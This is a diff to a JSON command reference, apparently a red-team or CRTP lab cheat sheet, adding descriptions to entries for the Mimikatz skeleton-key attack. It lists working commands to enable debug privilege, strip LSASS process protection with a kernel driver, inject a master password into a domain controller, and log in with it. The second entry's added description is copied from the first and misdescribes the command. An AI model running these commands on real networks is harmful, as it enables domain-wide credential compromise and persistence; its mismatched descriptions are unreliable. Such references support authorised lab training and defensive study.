@@ -219,15 +219,18 @@
   "variations": [
     {
       "label": "SafetyKatz (CRTP lab tool)",
-      "command": "SafetyKatz.exe '\"privilege::debug\" \"misc::skeleton\"' \"<dc_fqdn>\""
+      "command": "SafetyKatz.exe '\"privilege::debug\" \"misc::skeleton\"' \"<dc_fqdn>\"",
+      "description": "Enables SeDebugPrivilege in the current process. Required before most Mimikatz credential-dumping operations as it grants access to other processes' memory (LSASS)."
     },
     {
       "label": "LSASS PPL bypass via mimidriv.sys (kernel driver)",
-      "command": "mimikatz # privilege::debug\nmimikatz # !+\nmimikatz # !processprotect /process:lsass.exe /remove\nmimikatz # misc::skeleton\nmimikatz # !-"
+      "command": "mimikatz # privilege::debug\nmimikatz # !+\nmimikatz # !processprotect /process:lsass.exe /remove\nmimikatz # misc::skeleton\nmimikatz # !-",
+      "description": "Enables SeDebugPrivilege in the current process. Required before most Mimikatz credential-dumping operations as it grants access to other processes' memory (LSASS)."
     },
     {
       "label": "Then auth with the master password 'mimikatz'",
-      "command": "Enter-PSSession -ComputerName <host> -Credential <domain>\\<user>\n# Password: mimikatz"
+      "command": "Enter-PSSession -ComputerName <host> -Credential <domain>\\<user>\n# Password: mimikatz",
+      "description": "Opens an interactive PowerShell Remoting session to a remote machine. Provides a live shell on the target through WinRM - similar to SSH for Windows environments."
     }
   ],
   "explain": "Patches LSASS on a DC to add a master password that authenticates as ANY account alongside its real one:\n  Invoke-Mimikatz          run Mimikatz remotely\n  -Command '\"misc::skeleton\"'   inject the skeleton key into lsass on the DC\n  -ComputerName <dc_host>  the Domain Controller to patch (needs DA + code exec on the DC)\nAfterwards any user logs on with the password 'mimikatz' (or their own). It lives only in memory, so it does NOT survive a DC reboot - re-inject as needed."
